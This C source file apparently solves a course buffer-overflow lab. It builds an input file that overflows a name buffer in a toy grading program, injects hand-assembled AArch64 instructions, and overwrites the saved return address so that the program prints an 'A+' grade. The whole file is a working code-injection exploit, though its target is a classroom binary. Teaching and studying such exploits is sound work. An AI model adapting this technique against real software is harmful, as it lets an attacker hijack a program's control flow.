#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

int main(void) {
    char pcInject[48];
    char pcName[] = "Ang & Jade";
    int iNameLength;
    int i;
    unsigned long uiTargetAddr = 0x420064;
    unsigned int uiAdr, uiAdr1, uiB;
    FILE *psFile;

    /* get name(s) to use in dataA */
    /* max name length is 48 - 1 (for nullbyte) - 4 * 4 (for the 4
    instructions) */
    iNameLength = strlen(pcName) + 1;
    strcpy(pcInject, pcName);

    psFile = fopen("dataAplus", "w");
    /* write name */
    fwrite(pcInject, sizeof(char), iNameLength, psFile);
    /* padding */
    fprintf(psFile, "%c", '0');
    i = iNameLength + 1;
    
    /* write instructions */
    /* put address of new string in reg 0 */
    uiAdr = MiniAssembler_adr(0, 0x420070, 0x420064);
    fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
    i = i + 4;
    /* put address of new A+ string in reg 1 */
    uiAdr1 = MiniAssembler_adr(1, 0x420085, 0x420068);
    fwrite(&uiAdr1, sizeof(unsigned int), 1, psFile);
    i = i + 4;
    /* branch to print instr (0x4008ac is addr of printf instr in main,
    0x42006c is addr of this instr) */
    uiB = MiniAssembler_b(0x4008ac, 0x42006c);
    fwrite(&uiB, sizeof(unsigned int), 1, psFile);
    i = i + 4;
    fwrite("%s is your grade.\n\0", 1, 20, psFile);
    fprintf(psFile, "%s", "A+");
    i = i + 23;

    /* pad as necessary */
    for (; i < 48; i++) {
        fprintf(psFile, "%c", 0x30);
    }

    /* overwrite getName's x30 with addr of inject code in bss */
    uiTargetAddr = 0x420064;
    fwrite(&uiTargetAddr, sizeof(unsigned long), 1, psFile);
    fclose(psFile);

    return 0;
}
